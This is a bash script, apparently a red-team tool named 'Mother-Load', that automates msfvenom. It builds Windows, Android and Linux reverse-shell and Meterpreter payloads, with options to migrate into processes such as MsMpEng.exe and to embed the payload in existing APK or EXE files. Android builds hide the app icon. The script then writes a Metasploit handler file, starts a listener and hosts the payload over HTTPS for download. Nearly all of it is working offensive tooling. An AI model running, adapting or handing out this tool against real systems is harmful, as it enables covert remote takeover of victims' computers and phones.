#!/bin/bash



# ANSI Bold Colors
NC='\033[0m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'




echo -e "${GREEN}"
cat << 'EOF'
███╗   ███╗ ██████╗ ████████╗██╗  ██╗███████╗██████╗       ██╗      ██████╗  █████╗ ██████╗ 
████╗ ████║██╔═══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗      ██║     ██╔═══██╗██╔══██╗██╔══██╗
██╔████╔██║██║   ██║   ██║   ███████║█████╗  ██████╔╝█████╗██║     ██║   ██║███████║██║  ██║
██║╚██╔╝██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗╚════╝██║     ██║   ██║██╔══██║██║  ██║
██║ ╚═╝ ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║      ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 

By: Dean for RTX - Red Team eXpert

EOF
echo -e "${NC}"

declare -A DEPS=(
  [msfvenom]=metasploit-framework
  [msfconsole]=metasploit-framework
  [xterm]=xterm
  [apache2ctl]=apache2
  [openssl]=openssl
)

missing=()
installed_pkgs=()

for bin in "${!DEPS[@]}"; do
  pkg="${DEPS[$bin]}"
  if command -v "$bin" &>/dev/null; then
    echo -e "${GREEN}[+] $bin is already installed (provided by $pkg)${NC}"
  else
    echo -e "${YELLOW}[-] $bin not found, will install package: $pkg${NC}"
    missing+=("$pkg")
  fi
done

if [ ${#missing[@]} -gt 0 ]; then
  echo -e "${YELLOW}[!] Installing missing packages: ${missing[*]}${NC}"
  sudo apt-get update
  for pkg in "${missing[@]}"; do
    echo -e "${YELLOW}[*] Installing $pkg...${NC}"
    if sudo apt-get install -y "$pkg"; then
      echo -e "${GREEN}[+] $pkg installed successfully.${NC}"
      installed_pkgs+=("$pkg")
    else
      echo -e "${RED}[!] Failed to install $pkg!${NC}"
    fi
  done
  # summary of what actually got installed
  if [ ${#installed_pkgs[@]} -gt 0 ]; then
    echo -e "${GREEN}[+] Installed packages: ${installed_pkgs[*]}${NC}"
  else
    echo -e "${RED}[!] No packages were installed.${NC}"
  fi
else
  echo -e "${GREEN}[+] All dependencies already satisfied; nothing to install.${NC}"
fi

BORDER="${BLUE}---------------------------------------------------------------------------------------${NC}"

echo -e "${CYAN}Choose a payload from the options below:${NC}"
echo -e "${RED}[!] NOTICE: Choose a staged or stageless payload according to your needs.${NC}"
echo -e "${RED}[!] NOTICE: Stageless payloads produce larger files.${NC}"
echo -e "${RED}[!] NOTICE: Staged payloads produce smaller files, but will need to download the rest of the payload on the victim's side.${NC}"
echo -e "${YELLOW}1)  windows/shell_reverse_tcp${NC}         ${GREEN}- Stageless ${WHITE} payload. Sends the full shell to the target, which connects back and spawns a basic command shell.${NC}"
echo -e "${YELLOW}2)  windows/shell/reverse_tcp${NC}         ${BLUE}- Staged    ${WHITE} payload. Sends a lightweight stub that connects and downloads the full shell payload.${NC}"
echo -e "${YELLOW}3)  windows/shell_bind_tcp${NC}            ${GREEN}- Stageless ${WHITE} payload. Opens a port on the target system for manual connection to gain shell access.${NC}"
echo -e "${YELLOW}4)  windows/shell/bind_tcp${NC}            ${BLUE}- Staged    ${WHITE} payload. Listens with a stub and sends full shellcode when the attacker connects.${NC}"
echo -e "${YELLOW}5)  windows/meterpreter_reverse_tcp${NC}   ${GREEN}- Stageless ${WHITE} payload. Sends full Meterpreter at once and connects back to the listener.${NC}"
echo -e "${YELLOW}6)  windows/meterpreter/reverse_tcp${NC}   ${BLUE}- Staged    ${WHITE} payload. Uses a stub to connect and pull the Meterpreter payload in stages.${NC}"
echo -e "${YELLOW}7)  android/meterpreter_reverse_tcp${NC}   ${GREEN}- Stageless ${WHITE} payload. Installs the complete payload and connects back to the listener immediately.${NC}"
echo -e "${YELLOW}8)  android/meterpreter/reverse_tcp${NC}   ${BLUE}- Staged    ${WHITE} payload. Sends a stub that fetches the full Meterpreter and executes on Android.${NC}"
echo -e "${YELLOW}9)  linux/x86/meterpreter_reverse_tcp${NC} ${GREEN}- Stageless ${WHITE} payload. Sends the full payload from 32-bit Linux and connects back to listener.${NC}"
echo -e "${YELLOW}10) linux/x86/meterpreter/reverse_tcp${NC} ${BLUE}- Staged    ${WHITE} payload. Connects from 32-bit Linux and downloads the rest of Meterpreter.${NC}"
echo -e "${YELLOW}11) linux/x64/meterpreter_reverse_tcp${NC} ${GREEN}- Stageless ${WHITE} payload. Full Meterpreter is sent and executed from a 64-bit Linux target.${NC}"
echo -e "${YELLOW}12) linux/x64/meterpreter/reverse_tcp${NC} ${BLUE}- Staged    ${WHITE} payload. Lightweight stub from 64-bit Linux pulls and runs full Meterpreter.${NC}"

echo -ne "${BLUE}Enter the number of your choice: ${NC}"
read CHOICE

case $CHOICE in
1)
    PAYLOAD=windows/shell_reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Stageless reverse shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

2)
    PAYLOAD=windows/shell/reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse shell payload.${NC}"
    echo -e "${WHITE}  Sends a small stub that downloads the full shell. Smaller, but needs download access.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF StagerRetryCount=20 StagerRetryWait=300 $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

3)
    PAYLOAD=windows/shell_bind_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Stageless bind shell payload.${NC}"
    echo -e "${WHITE}  The victim opens a listening port and you connect to it to get a shell.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the target (RHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD RHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

4)
    PAYLOAD=windows/shell/bind_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged bind shell payload.${NC}"
    echo -e "${WHITE}  Victim listens with a small stub and sends the rest of the shell when you connect.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the target (RHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD RHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

5)
    PAYLOAD=windows/meterpreter_reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Stageless reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

6)
    PAYLOAD=windows/meterpreter/reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    while true; do
        echo -ne "${YELLOW}Enter the EXITFUNC option (Accepted: seh, thread, process, none): ${NC}"
        echo -e "${RED}[!] RECOMMENDED: thread${NC}"
        read EXTF
        if [[ -z "$EXTF" || "$EXTF" =~ ^(seh|thread|process|none)$ ]]; then
            break
        else
            echo -e "${RED}[-] Invalid EXITFUNC value. Please try again.${NC}"
        fi
    done

    echo -e "${BLUE}Do you want to use PrependMigrate (spawn new process and inject shellcode)? (yes/no): ${NC}"
    read USE_MIGRATE

    if [ "$USE_MIGRATE" = "yes" ]; then
        echo -ne "${BLUE}Enter the process name to spawn (explorer.exe, MsMpEng.exe, notepad.exe): ${NC}"
        read MIG_PROC
        MIGRATE_OPTS="PrependMigrate=true PrependMigrateProc=$MIG_PROC"
    else
        MIGRATE_OPTS=""
    fi

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT EXITFUNC=$EXTF $MIGRATE_OPTS"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

7)
    PAYLOAD=android/meterpreter_reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Stageless Android Meterpreter reverse TCP payload.${NC}"
    echo -e "${WHITE}  Installs the complete payload and connects back to your listener immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT AndroidHideAppIcon=true AndroidWakelock=true StagerRetryCount=20 StagerRetryWait=10 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

8)
    PAYLOAD=android/meterpreter/reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged Android Meterpreter reverse TCP payload.${NC}"
    echo -e "${WHITE}  Sends a stub that downloads and executes the full Meterpreter payload on the target.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT AndroidHideAppIcon=true AndroidWakelock=true StagerRetryCount=20 StagerRetryWait=10 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

9)
    PAYLOAD=linux/x86/meterpreter_reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT StagerRetryCount=20 StagerRetryWait=10 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    
    
    
    
    ;;

10)
    PAYLOAD=linux/x86/meterpreter/reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT StagerRetryCount=20 StagerRetryWait=10 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    
    
    
    ;;

11)
    PAYLOAD=linux/x64/meterpreter_reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT StagerRetryCount=20 StagerRetryWait=10 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

12)
    PAYLOAD=linux/x64/meterpreter/reverse_tcp
    echo -e $BORDER
    echo -e "${CYAN}[*] Payload selected: ${WHITE}$PAYLOAD${NC}"
    echo -e $BORDER
    echo -e "${YELLOW}- Staged reverse Meterpreter shell payload.${NC}"
    echo -e "${WHITE}  The victim connects back to your listener and spawns a Meterpreter shell immediately.${NC}"
    echo -e $BORDER

    echo -ne "${BLUE}Enter the IP of the listening local host (LHOST): ${NC}"
    read HOST

    echo -ne "${BLUE}Enter the listening local port (LPORT): ${NC}"
    read PORT

    BPAYLOAD="msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT StagerRetryCount=20 StagerRetryWait=1 SessionRetryTotal=86400 SessionRetryWait=30"
    echo -e "\n${GREEN}Generated Payload Command:${NC}\n${WHITE}$BPAYLOAD${NC}"
    ;;

*)
    echo -e "${RED}Invalid choice. Exiting.${NC}"
    exit 1
    ;;
esac

echo -e "${BLUE}Do you want to implant the payload into an existing file (yes/no)?${NC}"
read IMPLNT

if [ "$IMPLNT" = "yes" ]; then 
    echo -e "${BLUE}Insert the path to the file you want to use:${NC}"
    read FILEPATH
    FILE="-x $FILEPATH -k"

    echo -e "${BLUE}Enter the correct file type that matches the original file (e.g.,apk exe, dll, elf):${NC}"
    read FILETYPE

    echo -e "${BLUE}Enter the output filename for the payload (e.g., payload.exe ,payload.apk):${NC}"
    read FILENAME

    DATA="$FILE -f $FILETYPE -o $FILENAME"
    echo -e "${GREEN}$BPAYLOAD $DATA${NC}"
else
    echo -e "${BLUE}Enter the correct file type that matches the original file (e.g., exe, dll, elf):${NC}"
    read FILETYPE

    echo -e "${BLUE}Enter the output filename for the payload (e.g., payload.exe):${NC}"
    read FILENAME

    DATA="-f $FILETYPE -o $FILENAME"
    echo -e "${GREEN}$BPAYLOAD $DATA${NC}"
fi    

function payl0g() {
    EPOCH=$(date +%s)
    DATE=$(date +"%d %B %Y %H:%M")

    PAYLOAD_DIR="${FILENAME}_${EPOCH}"
    mkdir -p "$PAYLOAD_DIR"

    PAYLOAD_LOG="$PAYLOAD_DIR/$FILENAME.log"

    touch "$PAYLOAD_LOG"
    echo "$DATE" >> "$PAYLOAD_LOG"
    echo "$FINAL_PAYLOAD" >> "$PAYLOAD_LOG"
    echo -e "${GREEN}[+] Payload saved to: $PAYLOAD_LOG${NC}"
}

#  Metasploit RC-file generator
generate_rc() {
    # strip extension
    local base="${FILENAME%.*}"
    local rcfile="$PAYLOAD_DIR/${base}.rc"

    cat > "$rcfile" <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $HOST
set LPORT $PORT
set ExitOnSession false
exploit -j -z
EOF

    echo "[+] Created RC file: $rcfile" | tee -a "$PAYLOAD_LOG"
}

function deploy_to_apache_https() {
    function APACHE_TEST() {
        sudo systemctl start apache2
        sudo systemctl enable apache2
        
        sudo cp "$PAYLOAD_DIR/$FILENAME" /var/www/html/
        
        ACTIVE=$(systemctl is-active apache2)
        echo -e "\033[1;32m Apache is: $ACTIVE \033[0m"

        if [[ "$ACTIVE" != "active" ]]; then
            echo -e "\033[1;31m [-NOTICE-] Apache2 isn't activating, please check the problem and try again. \033[0m"
        fi
    }

    function RUN() {
        sudo a2enmod ssl
        sudo systemctl reload apache2
    }

    function INPUT() {
        read -p $'\033[1;34mEnter server country: \033[0m' COUNTRY
        read -p $'\033[1;34mEnter server state: \033[0m' STATE
        read -p $'\033[1;34mEnter server city: \033[0m' CITY
        read -p $'\033[1;34mEnter organization: \033[0m' ORG
        read -p $'\033[1;34mEnter common name (e.g., localhost): \033[0m' CN
        read -p $'\033[1;34mEnter email address: \033[0m' EMAIL
        read -p $'\033[1;34mEnter server IP: \033[0m' IP
    }

    function SSL() {
        SSL_DIR="/etc/apache2/ssl"
        sudo mkdir -p "$SSL_DIR"

        sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
            -keyout "$SSL_DIR/selfsigned.key" \
            -out "$SSL_DIR/selfsigned.crt" \
            -subj "/C=$COUNTRY/ST=$STATE/L=$CITY/O=$ORG/CN=$CN/emailAddress=$EMAIL"

        echo -e "\033[1;32m✅ SSL certificate created at $SSL_DIR \033[0m"
    }

    function SELFSIGNED() {
        sudo a2ensite default-ssl.conf
        sudo systemctl reload apache2
        echo "ServerName localhost" | sudo tee -a /etc/apache2/apache2.conf > /dev/null
    }

    CONFTEST=$(apache2ctl configtest 2>/dev/null)

    if [[ "$CONFTEST" == *"Syntax OK"* ]]; then
        echo -e "\033[1;32m✅ Apache server configured correctly. \033[0m"
    else
        echo -e "\033[1;31m❌ The Apache server isn't configured correctly. \033[0m"
    fi

    APACHE_TEST
    RUN
    INPUT
    SSL
    SELFSIGNED
}

echo -e "${RED}Is this the payload you want to create? Type ${BLUE}'yes'${NC}${RED} to generate the payload.${NC}"
echo -e "${GREEN}$BPAYLOAD $DATA${NC}" 
read CONFIRMATION

if [ "$CONFIRMATION" = "yes" ]; then
    FINAL_PAYLOAD="$BPAYLOAD $DATA"
    echo -e "${CYAN}[*] Executing: ${WHITE}$FINAL_PAYLOAD${NC}"
    
    payl0g  # This logs the command and path
    
    echo -e "\n--- Payload Output ---\n" >> "$PAYLOAD_LOG"
    bash -c "$FINAL_PAYLOAD" | tee -a "$PAYLOAD_LOG"

    mv "$FILENAME" "$PAYLOAD_DIR/"
    echo "[+] Moved payload to: $PAYLOAD_DIR/$FILENAME" >> "$PAYLOAD_LOG"
    generate_rc

    echo -e "${BLUE}Do you want to activate the listener? (yes/no): ${NC}"
    read OPEN_LISTENER
    
    rcfile="$PAYLOAD_DIR/${FILENAME%.*}.rc"
    
    if [ "$OPEN_LISTENER" = "yes" ]; then
        xterm -T "Metasploit Listener" \
             -e bash -c "msfconsole -qr \"$rcfile\" | tee -a \"$PAYLOAD_LOG\"" &
    else
        echo -e "${BLUE}Listener RC is at: $rcfile${NC}" \
             | tee -a "$PAYLOAD_LOG"
        echo -e "${BLUE}Run it with: msfconsole -qr \"$rcfile\"${NC}"
    fi
    
    deploy_to_apache_https
    IP=$(hostname -I | awk '{print $1}')
    echo "HTTPS Download: https://$IP/$FILENAME" >> "$PAYLOAD_LOG"
    echo -e "${CYAN}[*] HTTPS Download URL saved to log: ${WHITE}https://$IP/$FILENAME${NC}"
    
else
    echo -e "${RED}[!] Payload generation canceled by user.${NC}"
fi
